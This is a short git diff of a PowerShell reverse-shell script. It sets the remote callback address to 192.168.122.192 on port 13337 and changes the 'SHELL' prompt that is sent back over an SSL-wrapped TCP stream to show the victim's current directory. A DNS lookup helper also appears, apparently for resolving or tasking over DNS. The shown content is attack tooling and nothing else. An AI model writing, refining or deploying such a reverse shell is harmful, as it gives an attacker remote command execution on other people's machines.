@@ -3,7 +3,7 @@ function DNSLookup($DNSRecord){
     return ([System.Text.Encoding]::UTF8.GetString($response)|ConvertFrom-Json).Answer.data.trim('"')
 }
 
-$remoteIP = "x.x.x.x"
+$remoteIP = "192.168.122.192"
 $remotePort = "13337"
 
 do {
@@ -31,7 +31,7 @@ $streamWriter = New-Object System.IO.StreamWriter($sslStream)
 function writeStreamToServer($string){
     # create buffer for the next network stream read. buffer size is the default size of the tcp client which is 65536 bytes.
     [byte[]]$script:buffer = 0..$TCPConnection.ReceiveBufferSize | % {0}
-    $streamWriter.Write($string + 'SHELL:>')
+    $streamWriter.Write($string + 'SHELL '+(Get-Location).Path +' :>')
     $streamWriter.Flush()
 }
 
